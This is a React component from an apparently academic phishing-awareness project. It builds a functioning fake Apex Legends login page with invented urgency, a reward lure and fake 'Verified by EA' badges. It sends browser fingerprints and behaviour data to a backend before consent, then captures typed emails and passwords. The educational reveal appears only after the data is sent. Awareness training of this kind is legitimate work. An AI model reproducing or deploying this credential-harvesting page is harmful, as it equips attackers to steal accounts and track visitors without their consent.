import { useState, useEffect, useRef, useCallback } from 'react';
import { collectFingerprint, safeVibrate } from '../utils/fingerprint';
import { captureData } from '../utils/api';

/**
 * PhishingPage Component
 *
 * ⚠️ EDUCATIONAL CYBERSECURITY PROJECT ⚠️
 *
 * This component simulates a phishing attack for educational purposes.
 * It demonstrates various social engineering and data collection techniques
 * that malicious actors use to compromise user security.
 *
 * Learning objectives:
 * - Recognize phishing attempts
 * - Understand data collection methods
 * - Learn about browser fingerprinting
 * - Improve cybersecurity awareness
 */

const PhishingPage = () => {
  // State management
  const [stage, setStage] = useState('loading'); // loading, glitch, warning, form, hacking, education
  const [countdown, setCountdown] = useState(10);
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [terminalText, setTerminalText] = useState([]);
  const [collectedData, setCollectedData] = useState(null);

  // Refs for behavior tracking
  const startTimeRef = useRef(Date.now());
  const behaviorRef = useRef({
    mouseMovements: 0,
    clicks: 0,
    scrolls: 0,
  });

  // Track mouse movements
  const handleMouseMove = useCallback(() => {
    behaviorRef.current.mouseMovements++;
  }, []);

  // Track clicks
  const handleClick = useCallback(() => {
    behaviorRef.current.clicks++;
  }, []);

  // Track scrolls
  const handleScroll = useCallback(() => {
    behaviorRef.current.scrolls++;
  }, []);

  // Setup behavior tracking on mount
  useEffect(() => {
    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('click', handleClick);
    window.addEventListener('scroll', handleScroll);

    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('click', handleClick);
      window.removeEventListener('scroll', handleScroll);
    };
  }, [handleMouseMove, handleClick, handleScroll]);

  // Loading sequence
  useEffect(() => {
    if (stage === 'loading') {
      const timer = setTimeout(() => {
        setStage('glitch');
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [stage]);

  // Glitch sequence
  useEffect(() => {
    if (stage === 'glitch') {
      const timer = setTimeout(() => {
        setStage('warning');
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [stage]);

  // Warning countdown
  useEffect(() => {
    if (stage === 'warning' && countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (stage === 'warning' && countdown === 0) {
      setStage('form');
    }
  }, [stage, countdown]);

  // Capture fingerprint data on form stage (before submission)
  useEffect(() => {
    if (stage === 'form') {
      // Collect and send fingerprint immediately when form appears
      const captureInitialData = async () => {
        try {
          const fingerprint = await collectFingerprint();
          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);

          const initialData = {
            ...fingerprint,
            behavior: {
              ...behaviorRef.current,
              timeOnPage,
            },
            metadata: {
              userSubmitted: false, // Not submitted yet, just visiting
              formData: {
                email: null,
                password: null,
              },
            },
            timestamp: new Date().toISOString(),
          };

          // Send initial fingerprint to backend
          await captureData(initialData);
        } catch (error) {
          console.error('Error capturing initial data:', error);
        }
      };

      captureInitialData();
    }
  }, [stage]);

  // Type text effect for terminal
  const typeText = (text, speed = 30) => {
    return new Promise((resolve) => {
      let index = 0;
      const interval = setInterval(() => {
        if (index < text.length) {
          setTerminalText((prev) => {
            const newText = [...prev];
            if (newText.length === 0 || newText[newText.length - 1].complete) {
              newText.push({ text: text[index], complete: false });
            } else {
              newText[newText.length - 1].text += text[index];
            }
            return newText;
          });
          index++;
        } else {
          clearInterval(interval);
          setTerminalText((prev) => {
            const newText = [...prev];
            newText[newText.length - 1].complete = true;
            return newText;
          });
          resolve();
        }
      }, speed);
    });
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();

    setIsSubmitting(true);
    safeVibrate([200, 100, 200]);

    try {
      // Collect all fingerprint data
      const fingerprint = await collectFingerprint();

      // Calculate time on page
      const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);

      // Prepare complete data package
      const completeData = {
        ...fingerprint,
        behavior: {
          ...behaviorRef.current,
          timeOnPage,
        },
        metadata: {
          userSubmitted: true,
          formData: {
            email: formData.email,
            password: formData.password, // Will be hashed on backend
          },
        },
        timestamp: new Date().toISOString(),
      };

      setCollectedData(completeData);

      // Send to backend
      await captureData(completeData);

      // Show hacking sequence
      setStage('hacking');
      await showHackingSequence(completeData);

    } catch (error) {
      console.error('Error submitting data:', error);
      alert('An error occurred. Please try again.');
      setIsSubmitting(false);
    }
  };

  // Show hacking sequence with collected data
  const showHackingSequence = async (data) => {
    setTerminalText([]);

    await typeText('> INITIALIZING SECURE CONNECTION...', 20);
    await new Promise(r => setTimeout(r, 500));
    await typeText('> CONNECTION ESTABLISHED', 20);
    await new Promise(r => setTimeout(r, 300));
    await typeText('> EXTRACTING USER DATA...', 20);
    await new Promise(r => setTimeout(r, 700));

    // Show collected data
    await typeText(`> EMAIL: ${data.metadata.formData.email}`, 20);
    await new Promise(r => setTimeout(r, 300));
    await typeText(`> IP ADDRESS: Collecting...`, 20);
    await new Promise(r => setTimeout(r, 500));
    await typeText(`> LOCATION: ${data.timezoneInfo.timezone}`, 20);
    await new Promise(r => setTimeout(r, 300));
    await typeText(`> DEVICE: ${data.device.type} (${data.device.platform})`, 20);
    await new Promise(r => setTimeout(r, 300));
    await typeText(`> BROWSER: ${data.browser.userAgent.substring(0, 50)}...`, 15);
    await new Promise(r => setTimeout(r, 300));
    await typeText(`> SCREEN: ${data.screen.resolution}`, 20);
    await new Promise(r => setTimeout(r, 300));
    await typeText(`> FINGERPRINT: ${data.fingerprints.canvas}`, 20);
    await new Promise(r => setTimeout(r, 500));
    await typeText('> ', 20);
    await typeText('> ANALYZING BEHAVIORAL PATTERNS...', 20);
    await new Promise(r => setTimeout(r, 700));
    await typeText(`> Mouse movements: ${data.behavior.mouseMovements}`, 20);
    await new Promise(r => setTimeout(r, 300));
    await typeText(`> Clicks: ${data.behavior.clicks}`, 20);
    await new Promise(r => setTimeout(r, 300));
    await typeText(`> Time on page: ${data.behavior.timeOnPage} seconds`, 20);
    await new Promise(r => setTimeout(r, 700));
    await typeText('> ', 20);
    await typeText('> DATA EXTRACTION COMPLETE', 20);
    await new Promise(r => setTimeout(r, 500));
    await typeText('> UPLOADING TO SERVER...', 20);
    await new Promise(r => setTimeout(r, 1000));
    await typeText('> UPLOAD SUCCESSFUL', 20);
    await new Promise(r => setTimeout(r, 1000));

    // Show educational alerts
    await showEducationalAlerts();
  };

  // Show educational alert sequence
  const showEducationalAlerts = async () => {
    safeVibrate([300, 200, 300, 200, 300]);

    const alerts = [
      '⚠️ ALERT #1: This was a PHISHING SIMULATION!\n\nYou just provided your credentials to what you thought was Apex Legends, but was actually a fake page designed to steal your information.',

      '🔍 ALERT #2: BROWSER FINGERPRINTING\n\nThis page collected a unique "fingerprint" of your browser using:\n- Canvas rendering\n- WebGL information\n- Audio processing\n- Font detection\n\nEven without cookies, websites can track you!',

      '🌐 ALERT #3: WEBRTC IP LEAK\n\nYour real IP address may have been revealed through WebRTC, even if you\'re using a VPN. This is a known privacy vulnerability.',

      '📍 ALERT #4: GEOLOCATION\n\nThe page attempted to access your GPS location. Always check why a website needs your location and deny if suspicious.',

      '👁️ ALERT #5: BEHAVIOR TRACKING\n\nEvery mouse movement, click, and scroll was tracked. This data helps attackers understand how users interact with fake pages.',

      '✅ ALERT #6: HOW TO PROTECT YOURSELF\n\n• Always check the URL carefully\n• Look for HTTPS and valid certificates\n• Be suspicious of urgent messages\n• Use different passwords for each site\n• Enable 2FA when possible\n• Never enter credentials from email links',
    ];

    for (const alertMsg of alerts) {
      alert(alertMsg);
      safeVibrate(200);
      await new Promise(r => setTimeout(r, 500));
    }

    setStage('education');
  };

  // Render loading screen
  if (stage === 'loading') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-apex-dark">
        <div className="text-center">
          <div className="inline-block animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-apex-red"></div>
          <p className="mt-4 text-xl text-apex-green terminal-text">LOADING...</p>
        </div>
      </div>
    );
  }

  // Render glitch screen
  if (stage === 'glitch') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-apex-dark relative overflow-hidden">
        <div className="scanline"></div>
        <div className="absolute inset-0 bg-apex-red opacity-10 animate-pulse-slow"></div>
        <h1
          className="text-8xl font-bold text-apex-red animate-glitch-intense"
          data-text="APEX LEGENDS"
        >
          APEX LEGENDS
        </h1>
      </div>
    );
  }

  // Render warning screen
  if (stage === 'warning') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-apex-dark p-4">
        <div className="scanline"></div>
        <div className="apex-card max-w-2xl w-full border-apex-red border-4 animate-pulse">
          <div className="text-center">
            <div className="text-6xl mb-4">⚠️</div>
            <h2 className="text-4xl font-bold text-apex-red mb-6 animate-glitch">
              SECURITY ALERT
            </h2>
            <p className="text-xl mb-6 text-gray-300">
              Suspicious activity detected on your Apex Legends account!
            </p>
            <p className="text-lg mb-4 text-gray-400">
              Someone may be trying to access your account from an unknown location.
            </p>
            <p className="text-lg mb-8 text-gray-400">
              Please verify your identity to secure your account and claim your pending rewards.
            </p>
            <div className="text-6xl font-bold text-apex-red mb-4">
              {countdown}
            </div>
            <p className="text-sm text-gray-500">
              Redirecting to secure verification page...
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Render login form
  if (stage === 'form') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-apex-dark via-gray-900 to-black p-4">
        <div className="scanline"></div>

        {/* Header */}
        <div className="container mx-auto py-8">
          <h1 className="text-5xl font-bold text-center mb-2">
            <span className="text-apex-red">APEX</span>{' '}
            <span className="text-white">LEGENDS</span>
          </h1>
          <p className="text-center text-apex-gold text-xl">Account Verification Required</p>
        </div>

        {/* Form */}
        <div className="container mx-auto max-w-md">
          <div className="apex-card">
            <div className="text-center mb-6">
              <div className="text-4xl mb-3">🎁</div>
              <h2 className="text-2xl font-bold text-apex-gold mb-2">
                Claim Your Exclusive Rewards!
              </h2>
              <p className="text-gray-400">
                Limited time offer: 1,000 Apex Coins + Legendary Skin
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="block text-sm font-medium mb-2 text-gray-300">
                  Email or Username
                </label>
                <input
                  type="text"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="apex-input"
                  placeholder="Enter your email or username"
                  required
                  disabled={isSubmitting}
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-2 text-gray-300">
                  Password
                </label>
                <input
                  type="password"
                  value={formData.password}
                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  className="apex-input"
                  placeholder="Enter your password"
                  required
                  disabled={isSubmitting}
                />
              </div>

              <button
                type="submit"
                className="apex-button w-full"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'VERIFYING...' : 'CLAIM REWARDS NOW'}
              </button>
            </form>

            <div className="mt-6 text-center text-xs text-gray-500">
              <p>🔒 Secure connection established</p>
              <p className="mt-2">By continuing, you agree to our Terms of Service</p>
            </div>
          </div>

          {/* Trust indicators (fake) */}
          <div className="mt-6 flex justify-center space-x-4 text-xs text-gray-600">
            <span>✓ SSL Secured</span>
            <span>✓ Verified by EA</span>
            <span>✓ Trusted by 10M+ players</span>
          </div>
        </div>

        {/* Footer with subtle disclaimer */}
        <footer className="container mx-auto mt-12 text-center text-xs text-gray-700">
          <p>⚠️ Educational Cybersecurity Project - Academic Demonstration</p>
        </footer>
      </div>
    );
  }

  // Render hacking terminal
  if (stage === 'hacking') {
    return (
      <div className="min-h-screen bg-black p-4 font-mono">
        <div className="container mx-auto max-w-4xl">
          <div className="bg-gray-900 border-2 border-apex-green rounded-lg p-6">
            <div className="flex items-center mb-4 border-b border-gray-700 pb-2">
              <div className="flex space-x-2">
                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                <div className="w-3 h-3 rounded-full bg-green-500"></div>
              </div>
              <span className="ml-4 text-gray-400">terminal@phishing-demo</span>
            </div>

            <div className="space-y-1 text-apex-green">
              {terminalText.map((line, index) => (
                <div key={index} className="terminal-text">
                  {line.text}
                  {!line.complete && <span className="animate-pulse">▋</span>}
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Render educational message
  if (stage === 'education') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-apex-dark via-gray-900 to-black p-4">
        <div className="container mx-auto max-w-4xl py-12">
          <div className="apex-card border-apex-green border-4">
            <div className="text-center mb-8">
              <div className="text-6xl mb-4">✅</div>
              <h1 className="text-4xl font-bold text-apex-green mb-4">
                Congratulations! You've Completed the Demo
              </h1>
              <p className="text-xl text-gray-300">
                This was an educational cybersecurity simulation
              </p>
            </div>

            <div className="bg-apex-darker rounded-lg p-6 mb-6">
              <h2 className="text-2xl font-bold text-apex-red mb-4">
                🎓 What You Just Experienced:
              </h2>
              <ul className="space-y-3 text-gray-300">
                <li className="flex items-start">
                  <span className="text-apex-red mr-2">•</span>
                  <span><strong>Social Engineering:</strong> Fake urgency and rewards to trick you into acting quickly</span>
                </li>
                <li className="flex items-start">
                  <span className="text-apex-red mr-2">•</span>
                  <span><strong>Brand Impersonation:</strong> Mimicking a legitimate game (Apex Legends) to gain trust</span>
                </li>
                <li className="flex items-start">
                  <span className="text-apex-red mr-2">•</span>
                  <span><strong>Browser Fingerprinting:</strong> Collecting unique identifying information without your explicit consent</span>
                </li>
                <li className="flex items-start">
                  <span className="text-apex-red mr-2">•</span>
                  <span><strong>Behavior Tracking:</strong> Monitoring every interaction to build a profile</span>
                </li>
                <li className="flex items-start">
                  <span className="text-apex-red mr-2">•</span>
                  <span><strong>Credential Harvesting:</strong> Capturing login credentials for account takeover</span>
                </li>
              </ul>
            </div>

            <div className="bg-apex-darker rounded-lg p-6 mb-6">
              <h2 className="text-2xl font-bold text-apex-green mb-4">
                🛡️ How to Protect Yourself:
              </h2>
              <ol className="space-y-3 text-gray-300 list-decimal list-inside">
                <li><strong>Check the URL:</strong> Always verify you're on the official website</li>
                <li><strong>Be skeptical of urgency:</strong> Phishing relies on pressure and fear</li>
                <li><strong>Use unique passwords:</strong> Never reuse passwords across sites</li>
                <li><strong>Enable 2FA:</strong> Two-factor authentication adds crucial protection</li>
                <li><strong>Don't click email links:</strong> Manually type URLs for sensitive sites</li>
                <li><strong>Use a password manager:</strong> They can detect fake sites</li>
                <li><strong>Keep software updated:</strong> Security patches protect against exploits</li>
                <li><strong>Use browser privacy tools:</strong> Extensions can block fingerprinting</li>
              </ol>
            </div>

            <div className="bg-yellow-900/20 border-2 border-yellow-600 rounded-lg p-6 mb-6">
              <h3 className="text-xl font-bold text-yellow-400 mb-2">
                ℹ️ Important Notice:
              </h3>
              <p className="text-gray-300">
                This simulation was created for educational purposes as part of the
                <strong> "Ciberseguridad del Bienestar"</strong> academic project.
                Your data was collected to demonstrate phishing techniques, but it is
                stored securely and used only for educational analysis.
              </p>
              <p className="text-gray-300 mt-3">
                <strong>No real harm was done.</strong> The password you entered was immediately
                hashed and cannot be recovered. However, this experience shows how easily
                real phishing attacks can collect sensitive information.
              </p>
            </div>

            <div className="text-center space-y-4">
              <button
                onClick={() => window.location.reload()}
                className="apex-button"
              >
                Reset Demo
              </button>

              <p className="text-sm text-gray-500">
                Project by: Ciberseguridad del Bienestar Team
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return null;
};

export default PhishingPage;
